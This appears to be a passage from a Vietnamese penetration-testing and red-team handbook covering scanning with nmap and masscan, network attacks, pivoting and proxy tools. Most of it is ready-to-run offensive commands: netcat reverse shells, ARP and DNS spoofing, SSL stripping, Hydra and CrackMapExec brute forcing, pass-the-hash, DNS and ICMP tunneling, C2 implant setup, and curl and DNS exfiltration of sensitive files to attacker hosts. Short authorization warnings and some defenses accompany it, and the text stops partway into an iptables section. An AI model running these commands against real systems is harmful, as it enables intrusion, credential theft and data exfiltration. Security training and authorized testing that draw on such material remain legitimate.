# IDLE/Zombie Scan (cực kỳ stealth, dùng zombie host)
sudo nmap -sI zombie_host:port target

# Scan port cụ thể
nmap -p 80 192.168.1.100
nmap -p 80,443,8080 192.168.1.100
nmap -p 1-1000 192.168.1.100
nmap -p- 192.168.1.100           # TẤT CẢ 65535 ports
nmap --top-ports 100 192.168.1.100

# Scan cả TCP và UDP
nmap -sS -sU -p T:80,443,U:53,161 192.168.1.100
```

### Service & Version Detection

```bash
# Xác định service version
nmap -sV 192.168.1.100

# Intensity (0-9, mặc định 7)
nmap -sV --version-intensity 5 192.168.1.100

# OS Detection
sudo nmap -O 192.168.1.100

# Aggressive scan (OS + version + script + traceroute)
nmap -A 192.168.1.100

# Script scan (NSE - Nmap Scripting Engine)
nmap -sC 192.168.1.100           # Default scripts
nmap --script=vuln 192.168.1.100 # Vulnerability scripts

# Script cụ thể
nmap --script=http-title 192.168.1.100
nmap --script=smb-vuln-ms17-010 192.168.1.100
nmap --script=dns-brute example.com
nmap --script=http-enum 192.168.1.100     # Enum directories
```

### Nmap Scan kết hợp phổ biến

```bash
# Full TCP scan + version + default scripts + OS
sudo nmap -sS -sV -sC -O -p- 192.168.1.100 -oA full_scan

# Quick scan
nmap -T4 -F 192.168.1.100

# Stealth scan
sudo nmap -sS -T2 -f --data-length 24 192.168.1.100
# -T2: Chậm (ít bị phát hiện)
# -f: Fragment packets
# --data-length: Thêm random data vào packet

# Scan qua proxy/tor
nmap --proxies socks4://127.0.0.1:9050 192.168.1.100

# Output formats
nmap -oN output.txt 192.168.1.100     # Normal
nmap -oX output.xml 192.168.1.100     # XML
nmap -oG output.gnmap 192.168.1.100   # Grepable
nmap -oA output 192.168.1.100         # Cả 3 format
```

### NSE Scripts quan trọng

```bash
# Brute force
nmap --script=ssh-brute -p 22 192.168.1.100
nmap --script=ftp-brute -p 21 192.168.1.100
nmap --script=http-brute -p 80 192.168.1.100

# Vulnerability detection
nmap --script=vuln 192.168.1.100
nmap --script=smb-vuln* 192.168.1.100
nmap --script=ssl-heartbleed 192.168.1.100

# Enumeration
nmap --script=smb-enum-shares 192.168.1.100
nmap --script=smb-enum-users 192.168.1.100
nmap --script=http-methods 192.168.1.100
nmap --script=http-robots.txt 192.168.1.100

# Information gathering
nmap --script=whois-domain example.com
nmap --script=http-headers 192.168.1.100
nmap --script=ssl-cert 192.168.1.100
nmap --script=http-title 192.168.1.100
```

## 3.2 Masscan - Scanner siêu nhanh

```bash
# Scan nhanh toàn bộ Internet cho port 80
masscan 0.0.0.0/0 -p80 --rate=100000

# Scan subnet
masscan 192.168.1.0/24 -p1-65535 --rate=1000

# Output dạng list (dùng làm input cho nmap)
masscan 192.168.1.0/24 -p80,443 --rate=1000 -oL results.txt

# Kết hợp với nmap
masscan 10.0.0.0/8 -p80,443 --rate=10000 -oL open_hosts.txt
# Rồi nmap -sV -sC -iL open_hosts.txt
```

## 3.3 Netcat (nc) - Swiss Army Knife

```bash
# Banner grabbing
nc -nv 192.168.1.100 80
# Gõ: GET / HTTP/1.1
# Host: 192.168.1.100

# Port scan đơn giản
nc -znv 192.168.1.100 1-1000

# Listener (chờ kết nối)
nc -lvnp 4444

# Connect back (reverse shell)
nc 192.168.1.200 4444 -e /bin/bash      # Linux
nc 192.168.1.200 4444 -e cmd.exe        # Windows

# File transfer
# Bên nhận:
nc -lvnp 4444 > received_file
# Bên gửi:
nc 192.168.1.200 4444 < file_to_send

# Chat đơn giản
# Server: nc -lvnp 4444
# Client: nc 192.168.1.200 4444

# Port forwarding với socat (nc nâng cao)
socat TCP-LISTEN:8080,fork TCP:internal:80
```

---

# PHẦN 4: KỸ THUẬT TẤN CÔNG MẠNG

> **CHÚ Ý**: Chỉ thực hiện trong môi trường lab hoặc khi có authorization.

## 4.1 Man-in-the-Middle (MITM)

### ARP Spoofing/Poisoning

**Nguyên lý**: ARP không có xác thực. Bất kỳ ai cũng có thể gửi ARP Reply giả để nói "IP gateway là MAC của tôi".

```
Bình thường:
Victim → Gateway (192.168.1.1, MAC: AA:AA:AA:AA:AA:AA) → Internet

Sau ARP Spoof:
Victim → Attacker (192.168.1.1, MAC: CC:CC:CC:CC:CC:CC) → Gateway → Internet
          ↑ Attacker nhận TẤT CẢ traffic của victim
```

**Thực hiện**:
```bash
# Bật IP forwarding (để traffic vẫn đi tiếp, victim không mất mạng)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Dùng arpspoof
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1    # Nói victim: "gateway là tôi"
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100    # Nói gateway: "victim là tôi"

# Dùng ettercap (có GUI và nhiều plugin)
ettercap -T -q -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//

# Dùng bettercap (hiện đại hơn)
sudo bettercap -iface eth0
> net.probe on                   # Tìm host trong mạng
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> net.sniff on                   # Bắt traffic
```

### Phòng chống ARP Spoofing:
- Dynamic ARP Inspection (DAI) trên switch
- Static ARP entries cho gateway
- ArpWatch / XArp để giám sát
- 802.1X authentication

### SSL Stripping

**Nguyên lý**: Khi victim truy cập `http://bank.com`, server redirect sang `https://bank.com`. Attacker chặn redirect này, giữ kết nối HTTP với victim và HTTPS với server.

```bash
# Với bettercap
sudo bettercap -iface eth0
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> set http.proxy.sslstrip true
> http.proxy on
> net.sniff on

# Với sslstrip (cổ điển)
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sslstrip -l 10000
```

**HSTS bypass**: Nếu site dùng HSTS (HTTP Strict Transport Security), SSL strip không hoạt động vì browser nhớ phải dùng HTTPS. Bypass: đổi domain (bank.com → bankk.com).

### DNS Spoofing

**Nguyên lý**: Attacker đã MITM, chặn DNS query và trả DNS response giả.

```bash
# Với bettercap
sudo bettercap -iface eth0
> set dns.spoof.domains example.com
> set dns.spoof.address 192.168.1.200   # IP của attacker
> dns.spoof on

# Với ettercap
# Tạo file etter.dns:
# example.com  A  192.168.1.200
# *.example.com  A  192.168.1.200
ettercap -T -q -i eth0 -M arp:remote -P dns_spoof /192.168.1.100// /192.168.1.1//
```

## 4.2 DHCP Attacks

### DHCP Starvation

**Nguyên lý**: Gửi hàng ngàn DHCP Discover với MAC address giả → hết IP pool → host mới không lấy được IP.

```bash
# Dùng Yersinia
yersinia dhcp -attack 1 -interface eth0

# Hoặc dùng dhcpstarv
dhcpstarv -i eth0
```

### Rogue DHCP Server

**Nguyên lý**: Sau khi starve DHCP server thật, dựng DHCP server giả cung cấp gateway = IP attacker.

```bash
# Dùng metasploit
use auxiliary/server/dhcp
set SRVHOST 192.168.1.200
set NETMASK 255.255.255.0
set ROUTER 192.168.1.200          # Gateway = attacker!
set DNSSERVER 192.168.1.200       # DNS = attacker!
run
```

**Phòng chống**: DHCP Snooping trên switch.

## 4.3 VLAN Attacks

### VLAN Hopping - Switch Spoofing

**Nguyên lý**: Attacker giả làm switch, thiết lập trunk link → truy cập tất cả VLAN.

```bash
# Dùng Yersinia
yersinia dtp -attack 1 -interface eth0

# Thủ công với Linux (thêm VLAN interface)
modprobe 8021q
vconfig add eth0 200              # Thêm VLAN 200
ifconfig eth0.200 up
dhclient eth0.200                 # Lấy IP từ VLAN 200
```

### Double Tagging

**Nguyên lý**: Gửi frame với 2 VLAN tags. Switch bỏ tag ngoài (native VLAN), forward frame với tag trong đến VLAN đích.

**Điều kiện**: Attacker phải ở native VLAN, chỉ hoạt động một chiều.

**Phòng chống**:
- Không dùng VLAN 1 làm native VLAN
- Tắt DTP trên tất cả access ports (`switchport nonegotiate`)
- Tất cả access port phải gán VLAN rõ ràng

## 4.4 MAC Flooding

**Nguyên lý**: Switch có bảng CAM (Content Addressable Memory) với giới hạn entries. Gửi nhiều frame với MAC source giả → bảng CAM đầy → switch chuyển sang chế độ hub (broadcast tất cả) → attacker thấy tất cả traffic.

```bash
# Dùng macof
macof -i eth0

# Dùng Yersinia
yersinia -I                       # Interactive mode
```

**Phòng chống**: Port Security trên switch (giới hạn số MAC per port).

## 4.5 Password Attacks trên Network Services

### Hydra - Brute Force Online

```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# FTP
hydra -l admin -P wordlist.txt ftp://192.168.1.100

# HTTP POST form
hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP Basic Auth
hydra -l admin -P wordlist.txt 192.168.1.100 http-get /admin

# RDP
hydra -l administrator -P wordlist.txt rdp://192.168.1.100

# SMB
hydra -l admin -P wordlist.txt smb://192.168.1.100

# MySQL
hydra -l root -P wordlist.txt mysql://192.168.1.100

# Với username list
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# Giới hạn thread (tránh bị phát hiện/lock account)
hydra -t 4 -l admin -P wordlist.txt ssh://192.168.1.100
```

### CrackMapExec (CME) - AD/SMB Swiss Army Knife

```bash
# SMB password spray
crackmapexec smb 192.168.1.0/24 -u admin -p 'Password123'

# Với user list
crackmapexec smb 192.168.1.100 -u users.txt -p passwords.txt

# Pass-the-Hash
crackmapexec smb 192.168.1.100 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:hash'

# Enum shares
crackmapexec smb 192.168.1.100 -u admin -p 'pass' --shares

# Enum users
crackmapexec smb 192.168.1.100 -u admin -p 'pass' --users

# Execute command
crackmapexec smb 192.168.1.100 -u admin -p 'pass' -x 'whoami'

# WinRM
crackmapexec winrm 192.168.1.100 -u admin -p 'pass'
```

## 4.6 Responder - LLMNR/NBT-NS/MDNS Poisoning

**Nguyên lý**: Khi Windows resolve tên mà DNS thất bại, nó fallback sang LLMNR/NBT-NS (broadcast). Responder trả lời broadcast này → victim gửi credentials (NTLM hash) cho attacker.

```bash
# Chạy Responder
sudo responder -I eth0 -wrf

# Kết quả: Bắt được NTLMv2 hash
# [SMB] NTLMv2-SSP Hash: admin::DOMAIN:challenge:hash

# Crack hash với hashcat
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Hoặc relay hash (không cần crack)
ntlmrelayx.py -tf targets.txt -smb2support
```

## 4.7 Sniffing

### Passive Sniffing

```bash
# Wireshark: chọn interface → Start capture
# Hoặc tcpdump
sudo tcpdump -i eth0 -w sniff.pcap

# Tìm credentials trong capture
# HTTP POST (form login)
tcpdump -i eth0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' | grep -i 'pass\|user\|login'

# FTP credentials
tcpdump -i eth0 -A 'tcp port 21' | grep -i 'user\|pass'

# Dùng dsniff (tự động extract credentials)
dsniff -i eth0
```

### Active Sniffing (phải MITM trước)
```bash
# Kết hợp ARP spoof + sniff
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t victim gateway &
arpspoof -i eth0 -t gateway victim &
dsniff -i eth0
# hoặc
wireshark &
```

---

# PHẦN 5: RED TEAM NETWORKING

## 5.1 Network Pivoting (Di chuyển qua mạng)

**Pivoting là gì?** Khi bạn compromise được 1 host, dùng nó làm bàn đạp để truy cập mạng internal mà bạn không thể truy cập trực tiếp.

```
Internet ──→ [Firewall] ──→ DMZ (10.10.10.0/24)
                                  │
                                  │ Compromised Host (10.10.10.5)
                                  │ Dual-homed (also on 172.16.0.0/24)
                                  │
                              Internal Network (172.16.0.0/24)
                              ← Đây là nơi bạn muốn đến
```

### SSH Tunneling (Phương pháp phổ biến nhất)

```bash
# === Local Port Forwarding ===
# Kịch bản: Bạn muốn truy cập internal web server (172.16.0.10:80)
# qua compromised host (10.10.10.5)
ssh -L 8080:172.16.0.10:80 user@10.10.10.5
# Giờ: localhost:8080 → 10.10.10.5 → 172.16.0.10:80

# === Remote Port Forwarding ===
# Kịch bản: Internal host không thể connect ra, nhưng bạn có VPS
# Trên compromised host:
ssh -R 9090:172.16.0.10:80 user@your-vps
# Giờ: your-vps:9090 → compromised-host → 172.16.0.10:80

# === Dynamic Port Forwarding (SOCKS Proxy) ===
# Kịch bản: Muốn truy cập TOÀN BỘ internal network
ssh -D 1080 user@10.10.10.5
# Cấu hình proxychains dùng socks5://127.0.0.1:1080
# Giờ: proxychains nmap 172.16.0.0/24

# === SSH qua nhiều hop (ProxyJump) ===
ssh -J user@jump1,user@jump2 user@target
# hoặc trong ~/.ssh/config:
# Host target
#     ProxyJump jump1,jump2

# === Reverse SSH tunnel (từ compromised host gọi về attacker) ===
# Trên attacker:
ssh -R 2222:localhost:22 attacker@attacker-vps
# Giờ attacker có thể: ssh -p 2222 localhost → vào compromised host
```

### Chisel (HTTP Tunneling - Bypass Firewall)

**Chisel** tạo tunnel qua HTTP, bypass firewall chỉ cho phép port 80/443.

```bash
# === Trên attacker (server mode) ===
chisel server --reverse --port 8080

# === Trên compromised host (client) ===
# SOCKS proxy
chisel client attacker-ip:8080 R:socks

# Port forwarding cụ thể
chisel client attacker-ip:8080 R:3389:172.16.0.10:3389

# Sau đó trên attacker:
proxychains nmap -sT 172.16.0.0/24
# hoặc
proxychains crackmapexec smb 172.16.0.0/24
```

### Ligolo-ng (Modern Tunneling - Tạo interface ảo)

```bash
# === Trên attacker ===
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Thêm route cho internal network
sudo ip route add 172.16.0.0/24 dev ligolo

# === Trên compromised host ===
./ligolo-agent -connect attacker-ip:11601 -ignore-cert

# Trên proxy console:
>> session              # Liệt kê sessions
>> start                # Bắt đầu tunnel

# Giờ trên attacker, truy cập trực tiếp:
nmap -sV 172.16.0.10    # Không cần proxychains!
```

### Metasploit Pivoting

```bash
# Sau khi có meterpreter session
meterpreter> run autoroute -s 172.16.0.0/24
meterpreter> background

# Thêm SOCKS proxy
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 1080
msf> run

# Hoặc port forward
meterpreter> portfwd add -l 8080 -p 80 -r 172.16.0.10
```

## 5.2 Lateral Movement (Di chuyển ngang)

### Pass-the-Hash (PtH)

**Nguyên lý**: NTLM authentication không cần password plaintext, chỉ cần hash.

```bash
# Với pth-winexe
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:hash' //192.168.1.100 cmd

# Với Impacket psexec
psexec.py -hashes :ntlm_hash admin@192.168.1.100

# Với Impacket wmiexec
wmiexec.py -hashes :ntlm_hash admin@192.168.1.100

# Với CrackMapExec
crackmapexec smb 192.168.1.0/24 -u admin -H 'ntlm_hash'
```

### Pass-the-Ticket (PtT) - Kerberos

```bash
# Export ticket từ memory (trên compromised Windows)
mimikatz> sekurlsa::tickets /export

# Import ticket
mimikatz> kerberos::ptt ticket.kirbi

# Hoặc với Rubeus
Rubeus.exe ptt /ticket:base64_ticket
```

### PsExec / WMI / WinRM

```bash
# PsExec (Impacket)
psexec.py domain/admin:password@192.168.1.100

# WMI
wmiexec.py domain/admin:password@192.168.1.100

# WinRM (Evil-WinRM)
evil-winrm -i 192.168.1.100 -u admin -p 'password'
evil-winrm -i 192.168.1.100 -u admin -H 'ntlm_hash'

# DCOM
dcomexec.py domain/admin:password@192.168.1.100

# SMBExec
smbexec.py domain/admin:password@192.168.1.100
```

### RDP

```bash
# Kết nối RDP
xfreerdp /u:admin /p:password /v:192.168.1.100

# Pass-the-Hash RDP (cần Restricted Admin mode)
xfreerdp /u:admin /pth:ntlm_hash /v:192.168.1.100

# RDP qua tunnel
ssh -L 3389:172.16.0.10:3389 user@pivot
xfreerdp /u:admin /p:pass /v:127.0.0.1
```

## 5.3 Tunneling & Covert Channels

### DNS Tunneling

**Nguyên lý**: DNS traffic thường không bị block. Encode dữ liệu vào DNS queries (subdomain) và responses (TXT records).

```bash
# === dnscat2 ===
# Trên attacker (DNS server):
dnscat2-server tunnel.attacker.com

# Trên compromised host:
./dnscat2 tunnel.attacker.com

# Trong dnscat2 console:
dnscat2> session -i 1
command (victim) > shell
command (victim) > download /etc/passwd
command (victim) > upload payload.exe

# === iodine (IP-over-DNS) ===
# Trên attacker:
iodined -f -c -P password 10.0.0.1 tunnel.attacker.com

# Trên compromised host:
iodine -f -P password tunnel.attacker.com

# Giờ có tunnel qua DNS: 10.0.0.1 ↔ 10.0.0.2
ssh user@10.0.0.1 -D 1080    # SOCKS proxy qua DNS tunnel
```

### ICMP Tunneling

```bash
# === icmpsh (Reverse ICMP shell) ===
# Trên attacker:
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python icmpsh_m.py attacker-ip victim-ip

# Trên victim:
icmpsh.exe -t attacker-ip

# === ptunnel-ng (TCP over ICMP) ===
# Server:
ptunnel-ng -r22 -R22

# Client:
ptunnel-ng -p server-ip -l 8022 -r22 -R22
ssh -p 8022 user@127.0.0.1
```

### HTTP/HTTPS Tunneling

```bash
# === reGeorg / Neo-reGeorg ===
# Upload tunnel script (PHP/ASP/JSP) lên web server compromised

# Trên attacker:
python neoreg.py generate -k password
# Upload tunnel.php lên target web server

python neoreg.py -k password -u http://target.com/tunnel.php
# SOCKS proxy ở 127.0.0.1:1080

# === Pivotnacci ===
# Tương tự reGeorg nhưng mới hơn
```

## 5.4 C2 (Command & Control) Frameworks

> Chỉ dùng trong authorized pentest/red team engagement.

### Cobalt Strike (Commercial)

```
Workflow:
1. Team Server: ./teamserver <ip> <password>
2. Client kết nối vào Team Server
3. Tạo Listener (HTTP, HTTPS, DNS, SMB)
4. Tạo Payload (Beacon)
5. Deliver payload cho target
6. Beacon gọi về → Interactive shell

Beacon features:
- Sleep/jitter (tránh phát hiện)
- Các command: shell, upload, download, screenshot
- Lateral movement: psexec, wmi, winrm
- Pivoting: SOCKS proxy, port forward
- Post-exploitation: mimikatz, kerberos
```

### Sliver (Open Source - Thay thế Cobalt Strike)

```bash
# Cài đặt
curl https://sliver.sh/install | sudo bash

# Khởi động
sliver

# Tạo implant
sliver > generate --mtls attacker-ip --os windows --arch amd64 --save implant.exe

# Tạo listener
sliver > mtls --lhost 0.0.0.0 --lport 8888

# Khi có session
sliver > sessions
sliver > use <session-id>
sliver (IMPLANT) > info
sliver (IMPLANT) > shell
sliver (IMPLANT) > upload /local/file /remote/path
sliver (IMPLANT) > download /remote/file /local/path
sliver (IMPLANT) > portfwd add --remote 172.16.0.10:80 --bind 127.0.0.1:8080
sliver (IMPLANT) > socks5 start
```

### Havoc (Open Source)

```bash
# Modern C2 framework
# Features: HTTP/HTTPS/SMB listeners
# Demon agent (implant)
# Post-exploitation modules
# Team collaboration
```

## 5.5 Exfiltration (Trích xuất dữ liệu)

```bash
# === Qua HTTP ===
# Trên attacker:
python3 -m http.server 8080
# Trên victim:
curl -X POST -d @sensitive_file http://attacker:8080/

# === Qua DNS ===
# Encode file thành hex, gửi qua subdomain
xxd -p sensitive_file | while read line; do
  nslookup $line.exfil.attacker.com attacker-dns
done

# === Qua ICMP ===
# Giấu data trong ICMP payload
hping3 -1 --data 200 -E sensitive_file attacker-ip

# === Qua SMB ===
smbclient //attacker/share -U '' -N -c 'put sensitive_file'

# === Qua encrypted channel ===
# Nén, mã hóa, rồi gửi
tar czf - /sensitive/dir | openssl enc -aes-256-cbc -pass pass:key | \
  curl -X POST --data-binary @- http://attacker:8080/
```

---

# PHẦN 6: PROXY & TRAFFIC INTERCEPTION

## 6.1 Charles Proxy

### Charles là gì?
Charles là HTTP/HTTPS proxy cho phép xem, sửa đổi, record tất cả HTTP/HTTPS traffic giữa máy tính và Internet. Rất hữu ích cho:
- Debug mobile app traffic
- Inspect API calls
- Modify requests/responses
- Test với throttling (giả lập mạng chậm)

### Cài đặt và Cấu hình

```
1. Download: https://www.charlesproxy.com/
2. Cài đặt
3. Charles tự động set system proxy (port 8888)
```

### Cấu hình SSL Proxying (HTTPS)

```
Bước 1: Bật SSL Proxying
  Proxy → SSL Proxying Settings → Enable SSL Proxying
  Add: Host: *, Port: 443 (hoặc specific host)

Bước 2: Cài Charles Root Certificate
  Help → SSL Proxying → Install Charles Root Certificate
  
  Trên máy tính:
  - Windows: Certificate import → Trusted Root Certification Authorities
  - macOS: Keychain → Always Trust
  - Linux: Copy cert vào /usr/local/share/ca-certificates/ → update-ca-certificates

  Trên mobile:
  - iOS: Safari → chcp.it/ssl → Install Profile → Settings → General → About → Trust
  - Android: Settings → Security → Install certificate
    (Android 7+ cần thêm vào app manifest: android:networkSecurityConfig)
```

### Cấu hình cho Mobile

```
1. Đảm bảo mobile và máy tính cùng WiFi
2. Charles: Proxy → Proxy Settings → Port: 8888
3. Mobile WiFi Settings → HTTP Proxy → Manual
   - Server: IP máy tính
   - Port: 8888
4. Cài SSL certificate (xem trên)
```

### Tính năng quan trọng

```
=== Structure View vs Sequence View ===
- Structure: Nhóm theo host (dạng cây)
- Sequence: Theo thứ tự thời gian

=== Breakpoints (Chặn và sửa request/response) ===
Proxy → Breakpoints
- Right-click request → Breakpoints
- Khi breakpoint hit: Edit request → Execute
- Sửa headers, body, URL, method

=== Map Remote ===
Tools → Map Remote
- Redirect request từ production → staging
- Ví dụ: api.production.com → api.staging.com

=== Map Local ===
Tools → Map Local
- Trả response từ file local thay vì server
- Dùng để mock API response

=== Rewrite ===
Tools → Rewrite
- Tự động modify headers, body, URL
- Ví dụ: Add header "X-Debug: true" cho tất cả request

=== Throttling ===
Proxy → Throttle Settings
- Giả lập mạng chậm (3G, EDGE, v.v.)
- Ẩn có tầm ảnh hưởng rõ: Test app khi mạng yếu

=== Repeat / Compose ===
- Right-click → Repeat: Gửi lại request
- Right-click → Compose: Sửa và gửi lại

=== Record / Stop Recording ===
- Recording: Charles capture traffic
- Lưu session: File → Save Session
```

### Charles cho Security Testing

```
1. Intercept và sửa API calls để test authorization
2. Replay request với token/session khác
3. Modify response để bypass client-side validation
4. SSL Proxying để xem encrypted traffic
5. Xem hidden API endpoints mà app gọi
6. Export session → phân tích offline
```

## 6.2 Burp Suite

### Burp Suite là gì?
Burp Suite là công cụ số 1 cho web application security testing. Powerful hơn Charles cho security research.

### Cấu hình

```
1. Proxy → Options → Proxy Listeners → 127.0.0.1:8080
2. Browser proxy: 127.0.0.1:8080
   - Firefox: Settings → Network → Manual Proxy
   - Chrome: dùng FoxyProxy extension
3. SSL: Proxy → Options → Import/Export CA Certificate
   - Truy cập http://burp/ → Download CA cert → Import vào browser
```

### Các module quan trọng

```
=== Proxy (Intercept) ===
- Intercept: ON/OFF → Chặn request, sửa, forward
- HTTP history: Xem tất cả request đã đi qua
- WebSockets: Xem WebSocket messages

=== Target ===
- Site Map: Cây cấu trúc website
- Scope: Define target scope (chỉ scan domain cho phép)

=== Scanner (Pro) ===
- Active scan: Tự động tìm vulnerability
- Passive scan: Phân tích response

=== Intruder ===
- Positions: Đánh dấu parameter cần fuzz
- Attack types:
  - Sniper: 1 payload, 1 position tại 1 thời điểm
  - Battering Ram: 1 payload, tất cả position cùng lúc
  - Pitchfork: Nhiều payload list, position 1-1
  - Cluster Bomb: Tất cả tổ hợp payloads

Ví dụ brute force login:
POST /login
username=§admin§&password=§test§
Payload 1: username list
Payload 2: password list
Attack type: Cluster Bomb

=== Repeater ===
- Gửi request, sửa, gửi lại → test thủ công
- So sánh response side by side

=== Decoder ===
- Encode/Decode: Base64, URL, HTML, Hex, v.v.
- Hash: MD5, SHA1, SHA256

=== Comparer ===
- So sánh 2 response → tìm khác biệt

=== Sequencer ===
- Phân tích chất lượng random của token/session
- Thu thập nhiều token → thống kê entropy
```

### Burp Extensions hữu ích

```
- Autorize: Test IDOR/authorization
- Logger++: Log nâng cao
- Active Scan++: Thêm scan checks
- JWT Editor: Sửa/tạo JWT tokens
- Param Miner: Tìm hidden parameters
- Turbo Intruder: Brute force siêu nhanh
- Collaborator Everywhere: Detect SSRF, blind XSS
- Hackvertor: Encode/decode nâng cao
```

## 6.3 Proxychains

### Proxychains là gì?
Force bất kỳ TCP connection nào đi qua proxy (SOCKS4/5, HTTP). Dùng để ẩn IP hoặc pivot qua compromised host.

### Cấu hình

```bash
# File config: /etc/proxychains4.conf (hoặc /etc/proxychains.conf)

# === Chế độ chaining ===

# Dynamic chain: thử proxy theo thứ tự, skip proxy chết
dynamic_chain

# Strict chain: phải đi qua TẤT CẢ proxy theo thứ tự
# strict_chain

# Random chain: chọn random proxy từ list
# random_chain

# === Proxy list (ở cuối file) ===
[ProxyList]
# type  host       port  user  pass
socks5  127.0.0.1  1080
socks4  127.0.0.1  9050           # Tor
http    10.10.10.5 3128
socks5  10.10.10.5 1080  user  pass

# === DNS resolution qua proxy ===
proxy_dns
```

### Sử dụng

```bash
# Scan qua proxy
proxychains nmap -sT -Pn 172.16.0.0/24    # Chỉ dùng -sT (TCP connect)
# KHÔNG dùng -sS (SYN scan) vì proxychains chỉ proxy TCP connections

# Tool bất kỳ qua proxy
proxychains curl http://internal-site.local
proxychains firefox
proxychains ssh user@172.16.0.10
proxychains crackmapexec smb 172.16.0.0/24

# Kết hợp với SSH SOCKS proxy
ssh -D 1080 user@pivot-host
# proxychains.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 172.16.0.10
```

### Proxychains + Tor

```bash
# Cài Tor
sudo apt install tor
sudo systemctl start tor    # SOCKS proxy ở 127.0.0.1:9050

# proxychains.conf:
[ProxyList]
socks5 127.0.0.1 9050

# Dùng
proxychains nmap -sT -Pn target
proxychains curl http://check.torproject.org
```

### Lưu ý quan trọng

```
1. Proxychains chỉ proxy TCP, KHÔNG proxy UDP/ICMP
   → Không dùng được: ping, traceroute, nmap -sU, DNS (trừ khi có proxy_dns)
   
2. Nmap qua proxychains:
   - Chỉ dùng -sT (TCP Connect scan)
   - Dùng -Pn (skip host discovery vì ICMP không qua proxy)
   - Chậm → scan ít port

3. Performance: Mỗi proxy thêm = thêm latency
   → Dùng ít proxy nhất có thể cho scanning
```

## 6.4 mitmproxy

### mitmproxy là gì?
Interactive HTTPS proxy, command-line alternative cho Burp Suite. Free và scriptable bằng Python.

```bash
# Cài đặt
pip install mitmproxy

# Chạy
mitmproxy           # Interactive TUI
mitmweb             # Web interface (port 8081)
mitmdump            # Command line (không interactive)

# Xem traffic
mitmproxy -p 8080

# Filter
mitmproxy -p 8080 --set flow_detail=3    # Full detail

# Script Python
mitmdump -s modify_request.py
```

### Script mitmproxy (Python)

```python
# modify_request.py
from mitmproxy import http

def request(flow: http.HTTPFlow):
    # Thêm header vào mọi request
    flow.request.headers["X-Custom"] = "injected"
    
    # Log URL
    print(f">> {flow.request.method} {flow.request.url}")

def response(flow: http.HTTPFlow):
    # Sửa response
    if "api/secret" in flow.request.url:
        flow.response.text = flow.response.text.replace("hidden", "exposed")
    
    # Inject JavaScript vào HTML response
    if "text/html" in flow.response.headers.get("content-type", ""):
        flow.response.text = flow.response.text.replace(
            "</body>",
            "<script>alert('injected')</script></body>"
        )
```

## 6.5 SOCKS Proxy vs HTTP Proxy

```
HTTP Proxy:
- Chỉ proxy HTTP/HTTPS traffic
- Proxy hiểu HTTP protocol → có thể cache, filter, modify
- Client gửi: CONNECT host:port HTTP/1.1
- Dùng cho: Web browsing, API testing

SOCKS4 Proxy:
- Proxy bất kỳ TCP traffic
- Không hiểu protocol → chỉ forward bytes
- Không hỗ trợ UDP, không hỗ trợ authentication
- Dùng cho: Tunneling

SOCKS5 Proxy:
- Proxy TCP và UDP
- Hỗ trợ authentication (username/password)
- Hỗ trợ DNS resolution qua proxy
- Dùng cho: Tunneling, Tor, SSH dynamic forwarding

So sánh:
┌──────────┬──────────┬──────────┬──────────┐
│ Feature  │ HTTP     │ SOCKS4   │ SOCKS5   │
├──────────┼──────────┼──────────┼──────────┤
│ TCP      │ ✓ (HTTP) │ ✓        │ ✓        │
│ UDP      │ ✗        │ ✗        │ ✓        │
│ Auth     │ Basic    │ ✗        │ ✓        │
│ DNS      │ Proxy    │ Client   │ Both     │
│ Protocol │ HTTP     │ Any TCP  │ Any      │
└──────────┴──────────┴──────────┴──────────┘
```

---

# PHẦN 7: FIREWALL & DEFENSE

## 7.1 Firewall Concepts

### Firewall là gì?
Firewall kiểm soát traffic vào/ra dựa trên rules. Có thể là hardware hoặc software.

### Các loại Firewall

```
1. Packet Filter Firewall (Stateless)
   - Kiểm tra từng packet độc lập
   - Dựa trên: Source IP, Dest IP, Source Port, Dest Port, Protocol
   - Nhanh nhưng dễ bypass
   - Ví dụ: iptables rules cơ bản

2. Stateful Firewall
   - Theo dõi trạng thái kết nối (connection tracking)
   - Biết packet thuộc kết nối nào (NEW, ESTABLISHED, RELATED)
   - Ví dụ: iptables với conntrack, Windows Firewall

3. Application Layer Firewall (WAF)
   - Hiểu protocol ở Layer 7
   - Có thể inspect nội dung HTTP, FTP, DNS
   - Block SQLi, XSS, v.v.
   - Ví dụ: ModSecurity, AWS WAF, Cloudflare

4. Next-Generation Firewall (NGFW)
   - Kết hợp tất cả: stateful + application aware + IDS/IPS
   - Deep packet inspection
   - Ví dụ: Palo Alto, Fortinet, Check Point
```

## 7.2 iptables (Linux Firewall)

### Kiến trúc iptables

```
Tables:
├── filter (mặc định) - Filtering traffic
│   ├── INPUT    - Traffic đến server
│   ├── FORWARD  - Traffic đi qua server (routing)
│   └── OUTPUT   - Traffic từ server đi ra
├── nat - Network Address Translation
│   ├── PREROUTING  - Trước khi routing (DNAT)
│   ├── POSTROUTING - Sau khi routing (SNAT/MASQUERADE)
│   └── OUTPUT      - NAT cho local traffic
├── mangle - Modify packet headers
└── raw    - Connection tracking exceptions
```

### iptables Commands

```bash
# === XEM RULES ===
sudo iptables -L -n -v                    # Liệt kê rules (filter table)
sudo iptables -L -n -v --line-numbers     # Với số dòng
sudo iptables -t nat -L -n -v             # NAT table

# === BASIC RULES ===

# Block IP cụ thể
sudo iptables -A INPUT -s 10.10.10.100 -j DROP

